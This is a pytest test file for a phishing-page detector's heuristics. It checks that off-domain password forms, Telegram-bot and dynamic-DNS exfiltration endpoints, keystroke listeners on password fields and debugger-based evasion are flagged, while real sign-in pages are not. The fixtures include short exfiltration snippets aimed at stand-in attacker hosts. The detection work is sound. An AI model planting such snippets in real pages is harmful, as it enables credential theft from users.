# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
# SPDX-License-Identifier: MIT-0
import pytest

from phish_agents.code_analyst.heuristics import derive_signals


def names(signals):
    return {s["name"] for s in signals}


def test_offdomain_password_form():
    cap = {
        "forms": [
            {
                "action": "https://collect.evil.ru/p.php",
                "method": "post",
                "inputs": ["email", "password"],
            }
        ],
        "scripts": [],
        "listeners": [],
        "sinks": [],
        "requests": [],
    }
    assert "credential_form_off_domain" in names(derive_signals(cap, "paypal-verify.xyz"))


def test_same_domain_password_form_is_not_flagged():
    cap = {
        "forms": [{"action": "/login", "method": "post", "inputs": ["password"]}],
        "scripts": [],
        "listeners": [],
        "sinks": [],
        "requests": [],
    }
    assert "credential_form_off_domain" not in names(derive_signals(cap, "example.com"))


def test_obfuscation_and_exfil_channels():
    js = "eval(atob('" + "A" * 500 + "')); fetch('https://api.telegram.org/bot123/sendMessage')"
    cap = {
        "forms": [],
        "scripts": [{"src": None, "text": js}],
        "listeners": [],
        "sinks": [],
        "requests": [],
    }
    got = names(derive_signals(cap, "x.com"))
    assert {
        "eval_or_function_constructor",
        "base64_decode",
        "long_encoded_blob",
        "telegram_bot_exfil",
    } <= got


def test_keylogger_listener_on_password_input():
    cap = {
        "forms": [],
        "scripts": [],
        "listeners": [{"type": "keydown", "target": "input[password]"}],
        "sinks": [{"kind": "beacon", "url": "https://other.site/k"}],
        "requests": [],
    }
    got = names(derive_signals(cap, "x.com"))
    assert {"key_listener_on_sensitive_input", "data_sent_off_domain"} <= got


def test_clean_page_has_no_signals():
    cap = {
        "forms": [],
        "scripts": [{"src": "https://x.com/app.js", "text": "console.info(1)"}],
        "listeners": [],
        "sinks": [],
        "requests": [],
    }
    assert derive_signals(cap, "x.com") == []


def test_key_listener_on_document_or_window_is_flagged():
    for target in ("document", "window"):
        cap = {
            "forms": [],
            "scripts": [],
            "listeners": [{"type": "keypress", "target": target}],
            "sinks": [],
            "requests": [],
        }
        assert "global_key_listener" in names(derive_signals(cap, "x.com")), target


def test_input_listener_on_document_is_not_a_global_key_listener():
    cap = {
        "forms": [],
        "scripts": [],
        "listeners": [{"type": "submit", "target": "document"}],
        "sinks": [],
        "requests": [],
    }
    assert "global_key_listener" not in names(derive_signals(cap, "x.com"))


# Shapes below mirror the 2026-10-11 live probe (derive_signals inputs, trimmed): four
# legitimate sign-in pages and the phishing kits they must stay apart from.
def cap(**kw):
    return {"forms": [], "scripts": [], "listeners": [], "sinks": [], "requests": [], **kw}


def high(signals):
    return {s["name"] for s in signals if s["severity"] in ("high", "critical")}


def sev(signals):
    return {s["name"]: s["severity"] for s in signals}


REACT = 'if("undefined"!=typeof __REACT_DEVTOOLS_GLOBAL_HOOK__)__REACT_DEVTOOLS_GLOBAL_HOOK__.x()'
LEGIT = {
    "github.com": cap(
        forms=[{"action": "/session", "inputs": ["hidden", "text", "password", "submit"]}],
        scripts=[
            {"src": "https://github.githubassets.com/assets/react-dom.js", "text": REACT},
            {
                "src": "https://github.githubassets.com/assets/ser.js",
                "text": "return navigator.clipboard.writeText(n)}async function j(){"
                'return[new ClipboardItem({"text/plain":navigator.clipboard.readText()})]}',
            },
        ],
        listeners=[
            {"type": "keydown", "target": "document", "via": "listener"},
            {"type": "input", "target": "input[text]", "via": "listener"},
        ],
        sinks=[
            {"kind": "fetch", "url": "https://github.com/u2f/login_fragment"},
            {"kind": "beacon", "url": "https://collector.github.com/github/collect"},
            {"kind": "beacon", "url": "https://api.github.com/_private/browser/stats"},
        ],
    ),
    "discord.com": cap(
        scripts=[{"src": "https://discord.com/assets/web.js", "text": "A" * 500}],
        listeners=[{"type": "keydown", "target": "window", "via": "listener"}],
        sinks=[
            {"kind": "fetch", "url": "/assets/34aec3bbe8b005d0.module.wasm"},
            {"kind": "xhr", "url": "https://discord.com/api/v9/science"},
        ],
    ),
    "www.paypal.com": cap(
        forms=[{"action": "/signin", "inputs": ["hidden", "email", "text", "password"]}],
        scripts=[{"src": None, "text": "String.fromCharCode(72)"}],
        listeners=[
            {"type": "keydown", "target": "input[password]", "via": "listener"},
            {"type": "keyup", "target": "input[email]", "via": "property"},
        ],
        sinks=[{"kind": "xhr", "url": "/signin/client-log"}],
    ),
    "login.microsoftonline.com": cap(
        forms=[
            {
                "action": "https://login.microsoftonline.com/common/login",
                "inputs": ["email", "password"],
            },
            {"action": "", "inputs": []},
        ],
        scripts=[{"src": "https://aadcdn.msftauth.net/x.js", "text": "x.devtools=1"}],
        listeners=[{"type": "input", "target": "input[password]", "via": "listener"}],
        sinks=[
            {"kind": "xhr", "url": "https://browser.events.data.microsoft.com/OneCollector/1.0/"}
        ],
    ),
}


@pytest.mark.parametrize("host", sorted(LEGIT))
def test_legitimate_sign_in_pages_raise_no_high_or_critical_signal(host):
    assert high(derive_signals(LEGIT[host], host)) == set()


def test_same_org_and_telemetry_hosts_are_not_off_domain():
    got = names(derive_signals(LEGIT["login.microsoftonline.com"], "login.microsoftonline.com"))
    assert "data_sent_off_domain" not in got
    assert "data_sent_off_domain" not in names(derive_signals(LEGIT["github.com"], "github.com"))


def test_key_listener_on_password_is_medium_without_an_off_domain_sink():
    got = sev(derive_signals(LEGIT["www.paypal.com"], "www.paypal.com"))
    assert got["key_listener_on_sensitive_input"] == "medium"


def test_devtools_word_is_not_evasion_but_a_debugger_timer_is():
    assert "devtools_evasion" not in names(derive_signals(LEGIT["github.com"], "github.com"))
    lone = cap(scripts=[{"src": None, "text": "function f(){debugger;}"}])
    assert "devtools_evasion" not in names(derive_signals(lone, "x.com"))
    for js in (
        "setInterval(function(){debugger;},100)",
        "setTimeout(() => { debugger }, 50)",
        "while(true){debugger;}",
    ):
        got = names(derive_signals(cap(scripts=[{"src": None, "text": js}]), "x.com"))
        assert "devtools_evasion" in got, js


def test_clipboard_write_is_not_hijack_and_read_is_not_high():
    write = cap(scripts=[{"src": None, "text": "navigator.clipboard.writeText(code)"}])
    assert "wallet_or_clipboard_hijack" not in names(derive_signals(write, "x.com"))
    read = cap(scripts=[{"src": None, "text": "navigator.clipboard.readText()"}])
    assert sev(derive_signals(read, "x.com"))["wallet_or_clipboard_hijack"] == "medium"
    wallet = cap(
        scripts=[{"src": None, "text": "ethereum.request({method:'eth_requestAccounts'})"}]
    )
    assert sev(derive_signals(wallet, "x.com"))["wallet_or_clipboard_hijack"] == "high"


def test_relative_telegram_endpoint_and_ip_lookup():
    # netflix-clone.example: the kit posts to its own /api/telegram/sendMessage.
    kit = cap(
        sinks=[
            {"kind": "fetch", "url": "https://api.ipify.org?format=json"},
            {"kind": "fetch", "url": "/api/telegram/sendMessage"},
        ]
    )
    got = sev(derive_signals(kit, "netflix-clone.example"))
    assert got["telegram_bot_exfil"] == "critical"
    assert got["ip_geolocation_lookup"] == "medium"


def test_telegram_endpoint_in_requests_counts_too():
    kit = cap(requests=[{"url": "https://k.example/x/sendMessage?chat_id=1", "method": "POST"}])
    assert "telegram_bot_exfil" in names(derive_signals(kit, "k.example"))


def test_dynamic_dns_receiver_with_port():
    # mail.intomahost2.com: keystrokes sent to duckdns hosts on non-web ports.
    kit = cap(
        listeners=[{"type": "keypress", "target": "input[password]", "via": "listener"}],
        sinks=[
            {"kind": "fetch", "url": "https://telegrambotcheck.duckdns.org:5001/receive_token?r=1"},
            {"kind": "fetch", "url": "https://chacktgbot.duckdns.org:7001/receive_token?r=2"},
        ],
    )
    got = derive_signals(kit, "mail.intomahost2.com")
    by = {s["name"]: s for s in got}
    assert by["dynamic_dns_receiver"]["severity"] == "high"
    assert ":5001" in by["dynamic_dns_receiver"]["detail"]
    assert by["key_listener_on_sensitive_input"]["severity"] == "high"


def test_dynamic_dns_host_in_script_text():
    js = "fetch('https://abc.ngrok-free.app/collect', {method:'POST'})"
    got = names(derive_signals(cap(scripts=[{"src": None, "text": js}]), "x.com"))
    assert "dynamic_dns_receiver" in got


def test_js_only_credential_submit():
    # 4everland kit: action javascript:void(0); replit kit: empty action and a script submit.
    js_action = cap(forms=[{"action": "javascript:void(0);", "inputs": ["email", "password"]}])
    assert sev(derive_signals(js_action, "a.4everland.app"))["js_only_credential_submit"] == "high"
    empty = cap(
        forms=[{"action": "", "inputs": ["password"]}],
        scripts=[{"src": None, "text": "form.onsubmit=e=>{e.preventDefault();send()}"}],
    )
    assert "js_only_credential_submit" in names(derive_signals(empty, "k.replit.app"))
    plain = cap(forms=[{"action": "", "inputs": ["password"]}])
    assert "js_only_credential_submit" not in names(derive_signals(plain, "x.com"))


def test_dynamic_dns_text_scan_is_linear_on_hostile_scripts():
    # The pattern used to retry from every character of a long run: 15 KB took seconds.
    import time

    started = time.monotonic()
    derive_signals({"scripts": [{"src": None, "text": "x" * 65_536}] * 3}, "a.example")
    assert time.monotonic() - started < 1.0
